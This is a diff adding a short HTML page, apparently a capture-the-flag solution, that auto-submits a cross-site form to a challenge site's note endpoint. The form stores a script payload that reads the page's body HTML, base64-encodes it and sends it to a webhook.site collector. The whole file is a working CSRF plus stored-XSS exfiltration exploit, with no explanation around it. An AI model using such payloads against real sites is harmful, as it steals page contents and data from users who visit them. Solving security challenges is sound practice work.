@@ -1,0 +1,17 @@
+<form
+  action="https://tbdxss.chal.perfect.blue/change_note"
+  id="noteform"
+  method="POST"
+>
+  <input
+    type="text"
+    id="data"
+    name="data"
+    value="<script>window.open(`javascript:document.location='https://webhook.site/6fb45621-d9bd-4cfe-83dd-229e4053b25c/?c='+window.btoa(escape(document.body.innerHTML))`,'haha')</script>"
+  />
+  <br />
+  <input type="submit" value="submit" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
